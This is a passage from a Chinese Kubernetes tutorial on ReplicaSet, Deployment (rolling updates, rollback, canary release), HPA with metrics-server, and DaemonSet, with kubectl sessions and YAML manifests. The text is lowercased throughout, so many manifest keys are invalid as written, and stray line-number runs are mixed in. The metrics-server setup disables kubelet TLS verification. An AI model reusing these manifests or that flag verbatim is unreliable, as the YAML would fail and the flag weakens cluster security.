114m\npc-replicaset-s2whj   1/1     running   0          10s\npc-replicaset-snrk2   1/1     running   0          114m\n\n# 当然也可以直接使用命令实现\n# 使用scale命令实现扩缩容， 后面--replicas=n直接指定目标数量即可\n[root@k8s-master01 ~]# kubectl scale rs pc-replicaset --replicas=2 -n dev\nreplicaset.apps/pc-replicaset scaled\n\n# 命令运行完毕，立即查看，发现已经有4个开始准备退出了\n[root@k8s-master01 ~]# kubectl get pods -n dev\nname                       ready   status        restarts   age\npc-replicaset-6vmvt   0/1     terminating   0          118m\npc-replicaset-cftnp   0/1     terminating   0          4m17s\npc-replicaset-fjlm6   0/1     terminating   0          4m17s\npc-replicaset-fmb8f   1/1     running       0          118m\npc-replicaset-s2whj   0/1     terminating   0          4m17s\npc-replicaset-snrk2   1/1     running       0          118m\n\n#稍等片刻，就只剩下2个了\n[root@k8s-master01 ~]# kubectl get pods -n dev\nname                       ready   status    restarts   age\npc-replicaset-fmb8f   1/1     running   0          119m\npc-replicaset-snrk2   1/1     running   0          119m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n镜像升级\n\n# 编辑rs的容器镜像 - image: nginx:1.17.2\n[root@k8s-master01 ~]# kubectl edit rs pc-replicaset -n dev\nreplicaset.apps/pc-replicaset edited\n\n# 再次查看，发现镜像版本已经变更了\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nname                desired  current   ready   age    containers   images        ...\npc-replicaset       2        2         2       140m   nginx         nginx:1.17.2  ...\n\n# 同样的道理，也可以使用命令完成这个工作\n# kubectl set image rs rs名称 容器=镜像版本 -n namespace\n[root@k8s-master01 ~]# kubectl set image rs pc-replicaset nginx=nginx:1.17.1  -n dev\nreplicaset.apps/pc-replicaset image updated\n\n# 再次查看，发现镜像版本已经变更了\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nname                 desired  current   ready   age    containers   images            ...\npc-replicaset        2        2         2       145m   nginx        nginx:1.17.1 ... \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n删除 replicaset\n\n# 使用kubectl delete命令会删除此rs以及它管理的pod\n# 在kubernetes删除rs前，会将rs的replicasclear调整为0，等待所有的pod被删除后，在执行rs对象的删除\n[root@k8s-master01 ~]# kubectl delete rs pc-replicaset -n dev\nreplicaset.apps "pc-replicaset" deleted\n[root@k8s-master01 ~]# kubectl get pod -n dev -o wide\nno resources found in dev namespace.\n\n# 如果希望仅仅删除rs对象（保留pod），可以使用kubectl delete命令时添加--cascade=false选项（不推荐）。\n[root@k8s-master01 ~]# kubectl delete rs pc-replicaset -n dev --cascade=false\nreplicaset.apps "pc-replicaset" deleted\n[root@k8s-master01 ~]# kubectl get pods -n dev\nname                  ready   status    restarts   age\npc-replicaset-cl82j   1/1     running   0          75s\npc-replicaset-dslhb   1/1     running   0          75s\n\n# 也可以使用yaml直接删除(推荐)\n[root@k8s-master01 ~]# kubectl delete -f pc-replicaset.yaml\nreplicaset.apps "pc-replicaset" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# deployment(deploy)\n\n为了更好的解决服务编排的问题，kubernetes 在 v1.2 版本开始，引入了 deployment 控制器。值得一提的是，这种控制器并不直接管理 pod，而是通过管理 replicaset 来简介管理 pod，即：deployment 管理 replicaset，replicaset 管理 pod。所以 deployment 比 replicaset 功能更加强大。\n\n\n\ndeployment 主要功能有下面几个：\n\n * 支持 replicaset 的所有功能\n * 支持发布的停止、继续\n * 支持滚动更新和回滚版本\n\ndeployment 的资源清单文件：\n\napiversion: apps/v1 # 版本号\nkind: deployment # 类型       \nmetadata: # 元数据\n  name: # rs名称 \n  namespace: # 所属命名空间 \n  labels: #标签\n    controller: deploy\nspec: # 详情描述\n  replicas: 3 # 副本数量\n  revisionhistorylimit: 3 # 保留历史版本\n  paused: false # 暂停部署，默认是false\n  progressdeadlineseconds: 600 # 部署超时时间（s），默认是600\n  strategy: # 策略\n    type: rollingupdate # 滚动更新策略\n    rollingupdate: # 滚动更新\n      maxsurge: 30% # 最大额外可以存在的副本数，可以为百分比，也可以为整数\n      maxunavailable: 30% # 最大不可用状态的 pod 的最大值，可以为百分比，也可以为整数\n  selector: # 选择器，通过它指定该控制器管理哪些pod\n    matchlabels:      # labels匹配规则\n      app: nginx-pod\n    matchexpressions: # expressions匹配规则\n      - {key: app, operator: in, values: [nginx-pod]}\n  template: # 模板，当副本数量不足时，会根据下面的模板创建pod副本\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerport: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n创建 deployment\n创建 pc-deployment.yaml，内容如下：\n\napiversion: apps/v1\nkind: deployment      \nmetadata:\n  name: pc-deployment\n  namespace: dev\nspec: \n  replicas: 3\n  selector:\n    matchlabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# 创建deployment\n[root@k8s-master01 ~]# kubectl create -f pc-deployment.yaml --record=true\ndeployment.apps/pc-deployment created\n\n# 查看deployment\n# up-to-date 最新版本的pod的数量\n# available  当前可用的pod的数量\n[root@k8s-master01 ~]# kubectl get deploy pc-deployment -n dev\nname            ready   up-to-date   available   age\npc-deployment   3/3     3            3           15s\n\n# 查看rs\n# 发现rs的名称是在原来deployment的名字后面添加了一个10位数的随机串\n[root@k8s-master01 ~]# kubectl get rs -n dev\nname                       desired   current   ready   age\npc-deployment-6696798b78   3         3         3       23s\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods -n dev\nname                             ready   status    restarts   age\npc-deployment-6696798b78-d2c8n   1/1     running   0          107s\npc-deployment-6696798b78-smpvp   1/1     running   0          107s\npc-deployment-6696798b78-wvjd8   1/1     running   0          107s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n扩缩容\n\n# 变更副本数量为5个\n[root@k8s-master01 ~]# kubectl scale deploy pc-deployment --replicas=5  -n dev\ndeployment.apps/pc-deployment scaled\n\n# 查看deployment\n[root@k8s-master01 ~]# kubectl get deploy pc-deployment -n dev\nname            ready   up-to-date   available   age\npc-deployment   5/5     5            5           2m\n\n# 查看pod\n[root@k8s-master01 ~]#  kubectl get pods -n dev\nname                             ready   status    restarts   age\npc-deployment-6696798b78-d2c8n   1/1     running   0          4m19s\npc-deployment-6696798b78-jxmdq   1/1     running   0          94s\npc-deployment-6696798b78-mktqv   1/1     running   0          93s\npc-deployment-6696798b78-smpvp   1/1     running   0          4m19s\npc-deployment-6696798b78-wvjd8   1/1     running   0          4m19s\n\n# 编辑deployment的副本数量，修改spec:replicas: 4即可\n[root@k8s-master01 ~]# kubectl edit deploy pc-deployment -n dev\ndeployment.apps/pc-deployment edited\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods -n dev\nname                             ready   status    restarts   age\npc-deployment-6696798b78-d2c8n   1/1     running   0          5m23s\npc-deployment-6696798b78-jxmdq   1/1     running   0          2m38s\npc-deployment-6696798b78-smpvp   1/1     running   0          5m23s\npc-deployment-6696798b78-wvjd8   1/1     running   0          5m23s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n镜像更新\ndeployment 支持两种更新策略: 重建更新（删掉所有老版本得pod，然后重建新版本的pod） 和 滚动更新（默认）（不会一次性删除，先删一部分低版本，建立一部分新版本，以此类推，直到满足数量） , 可以通过 strategy 指定策略类型，支持两个属性:\n\nstrategy：指定新的pod替换旧的pod的策略， 支持两个属性：\n  type：指定策略类型，支持两种策略\n    recreate：在创建出新的pod之前会先杀掉所有已存在的pod\n    rollingupdate：滚动更新，就是杀死一部分，就启动一部分，在更新过程中，存在两个版本pod\n  rollingupdate：当type为rollingupdate时生效，用于为rollingupdate设置参数，支持两个属性：\n    maxunavailable：用来指定在升级过程中不可用pod的最大数量，默认为25%。\n    maxsurge： 用来指定在升级过程中可以超过期望的pod的最大数量，默认为25%。\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n重建更新\n1. 编辑 pc-deployment.yaml, 在 spec 节点下添加更新策略\n\nspec:\n  strategy: # 策略\n    type: recreate # 重建更新\n\n\n1\n2\n3\n\n\n2. 创建 deploy 进行验证\n\n# 变更镜像\n[root@k8s-master01 ~]# kubectl set image deployment pc-deployment nginx=nginx:1.17.2 -n dev\ndeployment.apps/pc-deployment image updated\n\n# 观察升级过程\n[root@k8s-master01 ~]#  kubectl get pods -n dev -w\nname                             ready   status    restarts   age\npc-deployment-5d89bdfbf9-65qcw   1/1     running   0          31s\npc-deployment-5d89bdfbf9-w5nzv   1/1     running   0          31s\npc-deployment-5d89bdfbf9-xpt7w   1/1     running   0          31s\n\npc-deployment-5d89bdfbf9-xpt7w   1/1     terminating   0          41s\npc-deployment-5d89bdfbf9-65qcw   1/1     terminating   0          41s\npc-deployment-5d89bdfbf9-w5nzv   1/1     terminating   0          41s\n\npc-deployment-675d469f8b-grn8z   0/1     pending       0          0s\npc-deployment-675d469f8b-hbl4v   0/1     pending       0          0s\npc-deployment-675d469f8b-67nz2   0/1     pending       0          0s\n\npc-deployment-675d469f8b-grn8z   0/1     containercreating   0          0s\npc-deployment-675d469f8b-hbl4v   0/1     containercreating   0          0s\npc-deployment-675d469f8b-67nz2   0/1     containercreating   0          0s\n\npc-deployment-675d469f8b-grn8z   1/1     running             0          1s\npc-deployment-675d469f8b-67nz2   1/1     running             0          1s\npc-deployment-675d469f8b-hbl4v   1/1     running             0          2s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n滚动更新\n1. 编辑 pc-deployment.yaml, 在 spec 节点下添加更新策略\n\nspec:\n  strategy: # 策略\n    type: rollingupdate # 滚动更新策略\n    rollingupdate:\n      maxsurge: 25% \n      maxunavailable: 25%\n\n\n1\n2\n3\n4\n5\n6\n\n\n2. 创建 deploy 进行验证\n\n# 变更镜像\n[root@k8s-master01 ~]# kubectl set image deployment pc-deployment nginx=nginx:1.17.3 -n dev \ndeployment.apps/pc-deployment image updated\n\n# 观察升级过程\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nname                           ready   status    restarts   age\npc-deployment-c848d767-8rbzt   1/1     running   0          31m\npc-deployment-c848d767-h4p68   1/1     running   0          31m\npc-deployment-c848d767-hlmz4   1/1     running   0          31m\npc-deployment-c848d767-rrqcn   1/1     running   0          31m\n\npc-deployment-966bf7f44-226rx   0/1     pending             0          0s\npc-deployment-966bf7f44-226rx   0/1     containercreating   0          0s\npc-deployment-966bf7f44-226rx   1/1     running             0          1s\npc-deployment-c848d767-h4p68    0/1     terminating         0          34m\n\npc-deployment-966bf7f44-cnd44   0/1     pending             0          0s\npc-deployment-966bf7f44-cnd44   0/1     containercreating   0          0s\npc-deployment-966bf7f44-cnd44   1/1     running             0          2s\npc-deployment-c848d767-hlmz4    0/1     terminating         0          34m\n\npc-deployment-966bf7f44-px48p   0/1     pending             0          0s\npc-deployment-966bf7f44-px48p   0/1     containercreating   0          0s\npc-deployment-966bf7f44-px48p   1/1     running             0          0s\npc-deployment-c848d767-8rbzt    0/1     terminating         0          34m\n\npc-deployment-966bf7f44-dkmqp   0/1     pending             0          0s\npc-deployment-966bf7f44-dkmqp   0/1     containercreating   0          0s\npc-deployment-966bf7f44-dkmqp   1/1     running             0          2s\npc-deployment-c848d767-rrqcn    0/1     terminating         0          34m\n\n# 至此，新版本的pod创建完毕，就版本的pod销毁完毕\n# 中间过程是滚动进行的，也就是边销毁边创建\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n滚动更新的过程：\n\n\n\n镜像更新中 rs 的变化，可以在创建镜像得时候加 --recode 参数，有助于记录创建过程等。\n\n# 查看rs,发现原来的rs的依旧存在，只是pod数量变为了0，而后又新产生了一个rs，pod数量为4\n# 其实这就是deployment能够进行版本回退的奥妙所在，后面会详细解释\n[root@k8s-master01 ~]# kubectl get rs -n dev\nname                       desired   current   ready   age\npc-deployment-6696798b78   0         0         0       7m37s\npc-deployment-6696798b11   0         0         0       5m37s\npc-deployment-c848d76789   4         4         4       72s\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n版本回退\ndeployment 支持版本升级过程中的暂停、继续功能以及版本回退等诸多功能，下面具体来看.\n\nkubectl rollout： 版本升级相关功能，支持下面的选项：\n\n * status 显示当前升级状态\n * history 显示 升级历史记录\n * pause 暂停版本升级过程\n * resume 继续已经暂停的版本升级过程\n * restart 重启版本升级过程\n * undo 回滚到上一级版本（可以使用 --to-revision 回滚到指定版本）\n\n# 查看当前升级版本的状态\n[root@k8s-master01 ~]# kubectl rollout status deploy pc-deployment -n dev\ndeployment "pc-deployment" successfully rolled out\n\n# 查看升级历史记录\n[root@k8s-master01 ~]# kubectl rollout history deploy pc-deployment -n dev\ndeployment.apps/pc-deployment\nrevision  change-cause\n1         kubectl create --filename=pc-deployment.yaml --record=true\n2         kubectl create --filename=pc-deployment.yaml --record=true\n3         kubectl create --filename=pc-deployment.yaml --record=true\n# 可以发现有三次版本记录，说明完成过两次升级\n\n# 版本回滚\n# 这里直接使用--to-revision=1回滚到了1版本， 如果省略这个选项，就是回退到上个版本，就是2版本\n[root@k8s-master01 ~]# kubectl rollout undo deployment pc-deployment --to-revision=1 -n dev\ndeployment.apps/pc-deployment rolled back\n\n# 查看发现，通过nginx镜像版本可以发现到了第一版\n[root@k8s-master01 ~]# kubectl get deploy -n dev -o wide\nname            ready   up-to-date   available   age   containers   images         \npc-deployment   4/4     4            4           74m   nginx        nginx:1.17.1   \n\n# 查看rs，发现第一个rs中有4个pod运行，后面两个版本的rs中pod为运行\n# 其实deployment之所以可是实现版本的回滚，就是通过记录下历史rs来实现的，\n# 一旦想回滚到哪个版本，只需要将当前版本pod数量降为0，然后将回滚版本的pod提升为目标数量就可以了\n[root@k8s-master01 ~]# kubectl get rs -n dev\nname                       desired   current   ready   age\npc-deployment-6696798b78   4         4         4       78m\npc-deployment-966bf7f44    0         0         0       37m\npc-deployment-c848d767     0         0         0       71m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n金丝雀发布\ndeployment 控制器支持控制更新过程中的控制，如 “暂停 (pause)” 或 “继续 (resume)” 更新操作。\n\n比如有一批新的 pod 资源创建完成后立即暂停更新过程，此时，仅存在一部分新版本的应用，主体部分还是旧的版本。然后，再筛选一小部分的用户请求路由到新版本的 pod 应用，继续观察能否稳定地按期望的方式运行。确定没问题之后再继续完成余下的 pod 资源滚动更新，否则立即回滚更新操作。这就是所谓的金丝雀发布。\n\n# 更新deployment的版本，并配置暂停deployment\n[root@k8s-master01 ~]#  kubectl set image deploy pc-deployment nginx=nginx:1.17.4 -n dev && kubectl rollout pause deployment pc-deployment  -n dev\ndeployment.apps/pc-deployment image updated\ndeployment.apps/pc-deployment paused\n\n#观察更新状态\n[root@k8s-master01 ~]# kubectl rollout status deploy pc-deployment -n dev　\nwaiting for deployment "pc-deployment" rollout to finish: 2 out of 4 new replicas have been updated...\n\n# 监控更新的过程，可以看到已经新增了一个资源，但是并未按照预期的状态去删除一个旧的资源，就是因为使用了pause暂停命令\n\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nname                       desired   current   ready   age     containers   images         \npc-deployment-5d89bdfbf9   3         3         3       19m     nginx        nginx:1.17.1   \npc-deployment-675d469f8b   0         0         0       14m     nginx        nginx:1.17.2   \npc-deployment-6c9f56fcfb   2         2         2       3m16s   nginx        nginx:1.17.4   \n[root@k8s-master01 ~]# kubectl get pods -n dev\nname                             ready   status    restarts   age\npc-deployment-5d89bdfbf9-rj8sq   1/1     running   0          7m33s\npc-deployment-5d89bdfbf9-ttwgg   1/1     running   0          7m35s\npc-deployment-5d89bdfbf9-v4wvc   1/1     running   0          7m34s\npc-deployment-6c9f56fcfb-996rt   1/1     running   0          3m31s\npc-deployment-6c9f56fcfb-j2gtj   1/1     running   0          3m31s\n\n# 确保更新的pod没问题了，继续更新\n[root@k8s-master01 ~]# kubectl rollout resume deploy pc-deployment -n dev\ndeployment.apps/pc-deployment resumed\n\n# 查看最后的更新情况\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nname                       desired   current   ready   age     containers   images         \npc-deployment-5d89bdfbf9   0         0         0       21m     nginx        nginx:1.17.1   \npc-deployment-675d469f8b   0         0         0       16m     nginx        nginx:1.17.2   \npc-deployment-6c9f56fcfb   4         4         4       5m11s   nginx        nginx:1.17.4   \n\n[root@k8s-master01 ~]# kubectl get pods -n dev\nname                             ready   status    restarts   age\npc-deployment-6c9f56fcfb-7bfwh   1/1     running   0          37s\npc-deployment-6c9f56fcfb-996rt   1/1     running   0          5m27s\npc-deployment-6c9f56fcfb-j2gtj   1/1     running   0          5m27s\npc-deployment-6c9f56fcfb-rf84v   1/1     running   0          37s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\n删除 deployment\n\n# 删除deployment，其下的rs和pod也将被删除\n[root@k8s-master01 ~]# kubectl delete -f pc-deployment.yaml\ndeployment.apps "pc-deployment" deleted\n\n\n1\n2\n3\n\n\n\n# horizontal pod autoscaler(hpa)\n\n在前面的课程中，我们已经可以实现通过手工执行 kubectl scale 命令实现 pod 扩容或缩容，但是这显然不符合 kubernetes 的定位目标 -- 自动化、智能化。 kubernetes 期望可以实现通过监测 pod 的使用情况，实现 pod 数量的自动调整，于是就产生了 horizontal pod autoscaler（hpa）这种控制器。\n\nhpa 可以获取每个 pod 利用率，然后和 hpa 中定义的指标进行对比，同时计算出需要伸缩的具体值，最后实现 pod 的数量的调整。其实 hpa 与之前的 deployment 一样，也属于一种 kubernetes 资源对象，它通过追踪分析 rc 控制的所有目标 pod 的负载变化情况，来确定是否需要针对性地调整目标 pod 的副本数，这是 hpa 的实现原理。\n\n\n\n1 安装 metrics-server\nmetrics-server 可以用来收集集群中的资源使用情况\n\n# 安装git\n[root@k8s-master01 ~]# yum install git -y\n# 获取metrics-server, 注意使用的版本\n[root@k8s-master01 ~]# git clone -b v0.3.6 https://github.com/kubernetes-incubator/metrics-server\n# 修改deployment, 注意修改的是镜像和初始化参数\n[root@k8s-master01 ~]# cd /root/metrics-server/deploy/1.8+/\n[root@k8s-master01 1.8+]# vim metrics-server-deployment.yaml\n按图中添加下面选项\nhostnetwork: true\nimage: registry.cn-hangzhou.aliyuncs.com/google_containers/metrics-server-amd64:v0.3.6\nargs:\n- --kubelet-insecure-tls\n- --kubelet-preferred-address-types=internalip,hostname,internaldns,externaldns,externalip\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n\n# 安装metrics-server\n[root@k8s-master01 1.8+]# kubectl apply -f ./\n\n# 查看pod运行情况\n[root@k8s-master01 1.8+]# kubectl get pod -n kube-system\nmetrics-server-6b976979db-2xwbj   1/1     running   0          90s\n\n# 使用kubectl top node 查看资源使用情况\n[root@k8s-master01 1.8+]# kubectl top node\nname           cpu(cores)   cpu%   memory(bytes)   memory%\nk8s-master01   289m         14%    1582mi          54%       \nk8s-node01     81m          4%     1195mi          40%       \nk8s-node02     72m          3%     1211mi          41%  \n[root@k8s-master01 1.8+]# kubectl top pod -n kube-system\nname                              cpu(cores)   memory(bytes)\ncoredns-6955765f44-7ptsb          3m           9mi\ncoredns-6955765f44-vcwr5          3m           8mi\netcd-master                       14m          145mi\n...\n# 至此,metrics-server安装完成\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n2 准备 deployment 和 servie\n\napiversion: apps/v1\nkind: deployment\nmetadata:\n  name: nginx\n  namespace: dev\nspec:\n  strategy: # 策略\n    type: rollingupdate # 滚动更新策略\n  replicas: 1\n  selector:\n    matchlabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        resources: # 资源配额\n          limits:  # 限制资源（上限）\n            cpu: "1" # cpu限制，单位是core数\n          requests: # 请求资源（下限）\n            cpu: "100m"  # cpu限制，单位是core数\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n# 创建service\n[root@k8s-master01 1.8+]# kubectl expose deployment nginx --type=nodeport --port=80 -n dev\n\n\n1\n2\n\n\n# 查看\n[root@k8s-master01 1.8+]# kubectl get deployment,pod,svc -n dev\nname                    ready   up-to-date   available   age\ndeployment.apps/nginx   1/1     1            1           47s\n\nname                         ready   status    restarts   age\npod/nginx-7df9756ccc-bh8dr   1/1     running   0          47s\n\nname            type       cluster-ip      external-ip   port(s)        age\nservice/nginx   nodeport   10.101.18.29   <none>        80:31830/tcp   35s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n3 部署 hpa\n创建 pc-hpa.yaml 文件，内容如下：\n\napiversion: autoscaling/v1\nkind: horizontalpodautoscaler\nmetadata:\n  name: pc-hpa\n  namespace: dev\nspec:\n  minreplicas: 1  #最小pod数量\n  maxreplicas: 10 #最大pod数量\n  targetcpuutilizationpercentage: 3 # cpu使用率指标（3%）\n  scaletargetref:   # 指定要控制的nginx信息\n    apiversion: apps/v1\n    kind: deployment\n    name: nginx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 创建hpa\n[root@k8s-master01 1.8+]# kubectl create -f pc-hpa.yaml\nhorizontalpodautoscaler.autoscaling/pc-hpa created\n\n# 查看hpa\n    [root@k8s-master01 1.8+]# kubectl get hpa -n dev\nname     reference          targets   minpods   maxpods   replicas   age\npc-hpa   deployment/nginx   0%/3%     1         10        1          62s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n4 测试\n使用压测工具对 service 地址 192.168.5.4:31830 进行压测，然后通过控制台查看 hpa 和 pod 的变化\nhpa 变化\n\n[root@k8s-master01 ~]# kubectl get hpa -n dev -w\nname   reference      targets  minpods  maxpods  replicas  age\npc-hpa  deployment/nginx  0%/3%   1     10     1      4m11s\npc-hpa  deployment/nginx  0%/3%   1     10     1      5m19s\npc-hpa  deployment/nginx  22%/3%   1     10     1      6m50s\npc-hpa  deployment/nginx  22%/3%   1     10     4      7m5s\npc-hpa  deployment/nginx  22%/3%   1     10     8      7m21s\npc-hpa  deployment/nginx  6%/3%   1     10     8      7m51s\npc-hpa  deployment/nginx  0%/3%   1     10     8      9m6s\npc-hpa  deployment/nginx  0%/3%   1     10     8      13m\npc-hpa  deployment/nginx  0%/3%   1     10     1      14m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\ndeployment 变化\n\n[root@k8s-master01 ~]# kubectl get deployment -n dev -w\nname    ready   up-to-date   available   age\nnginx   1/1     1            1           11m\nnginx   1/4     1            1           13m\nnginx   1/4     1            1           13m\nnginx   1/4     1            1           13m\nnginx   1/4     4            1           13m\nnginx   1/8     4            1           14m\nnginx   1/8     4            1           14m\nnginx   1/8     4            1           14m\nnginx   1/8     8            1           14m\nnginx   2/8     8            2           14m\nnginx   3/8     8            3           14m\nnginx   4/8     8            4           14m\nnginx   5/8     8            5           14m\nnginx   6/8     8            6           14m\nnginx   7/8     8            7           14m\nnginx   8/8     8            8           15m\nnginx   8/1     8            8           20m\nnginx   8/1     8            8           20m\nnginx   1/1     1            1           20m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\npod 变化\n\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nname                     ready   status    restarts   age\nnginx-7df9756ccc-bh8dr   1/1     running   0          11m\nnginx-7df9756ccc-cpgrv   0/1     pending   0          0s\nnginx-7df9756ccc-8zhwk   0/1     pending   0          0s\nnginx-7df9756ccc-rr9bn   0/1     pending   0          0s\nnginx-7df9756ccc-cpgrv   0/1     containercreating   0          0s\nnginx-7df9756ccc-8zhwk   0/1     containercreating   0          0s\nnginx-7df9756ccc-rr9bn   0/1     containercreating   0          0s\nnginx-7df9756ccc-m9gsj   0/1     pending             0          0s\nnginx-7df9756ccc-g56qb   0/1     pending             0          0s\nnginx-7df9756ccc-sl9c6   0/1     pending             0          0s\nnginx-7df9756ccc-fgst7   0/1     pending             0          0s\nnginx-7df9756ccc-g56qb   0/1     containercreating   0          0s\nnginx-7df9756ccc-m9gsj   0/1     containercreating   0          0s\nnginx-7df9756ccc-sl9c6   0/1     containercreating   0          0s\nnginx-7df9756ccc-fgst7   0/1     containercreating   0          0s\nnginx-7df9756ccc-8zhwk   1/1     running             0          19s\nnginx-7df9756ccc-rr9bn   1/1     running             0          30s\nnginx-7df9756ccc-m9gsj   1/1     running             0          21s\nnginx-7df9756ccc-cpgrv   1/1     running             0          47s\nnginx-7df9756ccc-sl9c6   1/1     running             0          33s\nnginx-7df9756ccc-g56qb   1/1     running             0          48s\nnginx-7df9756ccc-fgst7   1/1     running             0          66s\nnginx-7df9756ccc-fgst7   1/1     terminating         0          6m50s\nnginx-7df9756ccc-8zhwk   1/1     terminating         0          7m5s\nnginx-7df9756ccc-cpgrv   1/1     terminating         0          7m5s\nnginx-7df9756ccc-g56qb   1/1     terminating         0          6m50s\nnginx-7df9756ccc-rr9bn   1/1     terminating         0          7m5s\nnginx-7df9756ccc-m9gsj   1/1     terminating         0          6m50s\nnginx-7df9756ccc-sl9c6   1/1     terminating         0          6m50s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# daemonset(ds)\n\ndaemonset 类型的控制器可以保证在集群中的每一台（或指定）节点上都运行一个副本。一般适用于日志收集、节点监控等场景。也就是说，如果一个 pod 提供的功能是节点级别的（每个节点都需要且只需要一个），那么这类 pod 就适合使用 daemonset 类型的控制器创建。\n\n\n\ndaemonset 控制器的特点：\n\n * 每当向集群中添加一个节点时，指定的 pod 副本也将添加到该节点上\n * 当节点从集群中移除时，pod 也就被垃圾回收了\n\n下面先来看下 daemonset 的资源清单文件\n\napiversion: apps/v1 # 版本号\nkind: daemonset # 类型       \nmetadata: # 元数据\n  name: # rs名称 \n  namespace: # 所属命名空间 \n  labels: #标签\n    controller: daemonset\nspec: # 详情描述\n  revisionhistorylimit: 3 # 保留历史版本\n  updatestrategy: # 更新策略\n    type: rollingupdate # 滚动更新策略\n    rollingupdate: # 滚动更新\n      maxunavailable: 1 # 最大不可用状态的 pod 的最大值，可以为百分比，也可以为整数\n  selector: # 选择器，通过它指定该控制器管理哪些pod\n    matchlabels:      # labels匹配规则\n      app: nginx-pod\n    matchexpressions: # expressions匹配规则\n      - {key: app, operator: in, values: [nginx-pod]}\n  template: # 模板，当副本数量不足时，会根据下面的模板创建pod副本\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerport: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n创建 pc-daemonset.yaml，内容如下：\n\napiversion: apps/v1\nkind: daemonset      \nmetadata:\n  name: pc-daemonset\n  namespace: dev\nspec: \n  selector:\n    matchlabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# 创建daemonset\n[root@k8s-master01 ~]# kubectl create -f  pc-daemonset.yaml\ndaemonset.apps/pc-daemonset created\n\n# 查看daemonset\n[root@k8s-master01 ~]#  kubectl get ds -n dev -o wide\nname        desired  current  ready  up-to-date  available   age   containers   images         \npc-daemonset   2        2        2      2           2        24s   nginx        nginx:1.17.1   \n\n# 查看pod,发现在每个node上都运行一个pod\n[root@k8s-master01 ~]#  kubectl get pods -n dev -o wide\nname                 ready   status    restarts   age   ip            node    \npc-daemonset-9bck8   1/1     running   0          37s   10.244.1.43   node1     \npc-daemonset-k224w   1/1     running   0          37s   10.244.2.74   node2      \n\n# 删除daemonset\n[root@k8s-master01 ~]# kubectl delete -f pc-daemonset.yaml\ndaemonset.apps "pc-daemonset" 